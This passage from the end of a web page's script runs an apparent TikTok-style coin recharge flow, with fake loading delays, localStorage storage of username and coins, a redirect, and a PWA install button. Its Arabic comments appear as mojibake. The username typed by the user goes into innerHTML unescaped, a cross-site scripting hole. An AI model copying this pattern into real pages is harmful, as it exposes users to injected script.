    // âœ… Ø§Ù„Ù…Ø¹Ø§Ø¯Ù„Ø© Ø§Ù„ØµØ­ÙŠØ­Ø©
    price = ((customAmount * 3) / 17000).toFixed(2);
  } else {
    // Ù„Ùˆ Ø§Ø®ØªØ§Ø± Ø£ÙŠ Ø®Ø§Ù†Ø© Ø¹Ø§Ø¯ÙŠØ©
    price = selected.querySelector("small")?.textContent.replace("$","") || 0;
  }
} else {
  price = 0;
}

// Ø®Ø²Ù†Ù‡ ÙÙŠ localStorage
localStorage.setItem("selectedPrice", price);

// ÙˆØ­Ø¯Ø«Ù‡ ÙÙŠ Ø§Ù„Ø¨ÙˆØ¨
document.getElementById("totalAmount").textContent = `$${price}`;    
document.getElementById('popupUser').innerHTML = `
  <div style="margin-bottom:20px; font-weight:bold;">
    Username: ${username}
  </div>
`;

// Ù‡Ù†Ø§ Ù‡Ù†Ø¶ÙŠÙ Ø§Ù„ØµÙˆØ±Ø© Ù…Ø¹ Ø§Ù„ÙƒÙ„Ù…Ø© Coins
document.getElementById('popupCoins').innerHTML = `
  <div class="coins-box">
    <img src="coin.png" alt="coin" class="coin-img">
    <span>Coins: ${coins}</span>
  </div>
`;

    // Ø§ÙØªØ­ Ø§Ù„Ø¨ÙˆØ¨
    const popup = document.getElementById('paymentPopup');
    popup.classList.add('show');

    // Ù„ÙˆØ¯Ø± ÙÙˆÙ‚ + Ø§Ø®ÙØ§Ø¡ Ø§Ù„ØªÙØ§ØµÙŠÙ„
    const popupLoader = document.getElementById('tiktok-loader');
    const popupDetails = document.getElementById('popupDetails');
    popupLoader.style.display = 'flex';
    popupDetails.style.display = 'none';

    // Ø¨Ø¹Ø¯ Ø«Ø§Ù†ÙŠØªÙŠÙ† Ø§Ø¹Ø±Ø¶ Ø§Ù„ØªÙØ§ØµÙŠÙ„
    setTimeout(() => {
      popupLoader.style.display = 'none';
      popupDetails.style.display = 'block';
    }, 2000);
  }, 2000);
});

// ===== Ø²Ø± Pay Now (Ø¨Ø±Ø§ Ø²Ø± Ø§Ù„Ø´Ø­Ù†) =====
payNowBtn.addEventListener('click', () => {
  const username = document.getElementById("username").value || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
  const selected = document.querySelector('.coin-option.selected');
  const custom = document.getElementById("customAmount").value;

  const coins = selected 
    ? (selected.classList.contains('custom') ? (custom || "0") : selected.dataset.amount) 
    : (custom || "0");

  // ØªØ®Ø²ÙŠÙ†
  localStorage.setItem("receiverName", username);
  localStorage.setItem("transferredCoins", coins);
  if (selected && !selected.classList.contains('custom')) {
    localStorage.setItem("lastPurchase", selected.dataset.amount);
  }

  // Ø§Ø®ÙÙŠ Ø§Ù„ØªÙØ§ØµÙŠÙ„ ÙˆØ§Ø¸Ù‡Ø± Ù†ÙØ³ Ù„ÙˆØ¯Ø± Ø§Ù„Ø¨ÙˆØ¨ ÙÙˆÙ‚
  const popupLoader = document.getElementById('tiktok-loader');
  const popupDetails = document.getElementById('popupDetails');
  popupDetails.style.display = 'none';
  popupLoader.style.display = 'flex';

  setTimeout(() => {
    window.location.href = "page2.html";
  }, 2000);
});

// PWA
window.addEventListener('beforeinstallprompt', (e) => {
  e.preventDefault();
  deferredPrompt = e;
  document.getElementById('installBtn').style.display = 'block';
});

document.getElementById('installBtn').addEventListener('click', async () => {
  if (!deferredPrompt) return;
  deferredPrompt.prompt();
  await deferredPrompt.userChoice;
  deferredPrompt = null;
  document.getElementById('installBtn').style.display = 'none';
});

// Ø§Ù„ØªØ¹Ø§Ù…Ù„ Ù…Ø¹ Ø§Ø®ØªÙŠØ§Ø± Ø§Ù„Ø®Ø§Ù†Ø§Øª
const options = document.querySelectorAll(".coin-option");
options.forEach(opt => {
  opt.addEventListener("click", () => {
    // Ù†Ø´ÙŠÙ„ selected Ù…Ù† Ø§Ù„ÙƒÙ„
    options.forEach(o => o.classList.remove("selected"));

    // Ù„Ùˆ ÙÙŠÙ‡ Ø®Ø§Ù†Ø© Ù‚Ø¯ÙŠÙ…Ø© (special) Ù†Ø®Ù„ÙŠÙ‡Ø§ Ø±Ù…Ø§Ø¯ÙŠØ©
    const currentSpecial = document.querySelector('.coin-option.special');
    if (currentSpecial && currentSpecial !== opt) {
      currentSpecial.classList.add("gray");
    }

    // Ù†Ø¶ÙŠÙ selected Ù„Ù„Ø®Ø§Ù†Ø© Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø©
    opt.classList.add("selected");
  });
});

// Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø© Ù†Ø±Ø¬Ø¹ Ø¢Ø®Ø± Ø¹Ù…Ù„ÙŠØ© Ø´Ø±Ø§Ø¡
window.addEventListener("load", () => {
  let last = localStorage.getItem("lastPurchase");
  if (last) {
    options.forEach(o => o.classList.remove("special", "gray"));
    let target = document.querySelector(`.coin-option[data-amount="${last}"]`);
    if (target) target.classList.add("special");
  }
});
});

</script>
</body>
  </html>
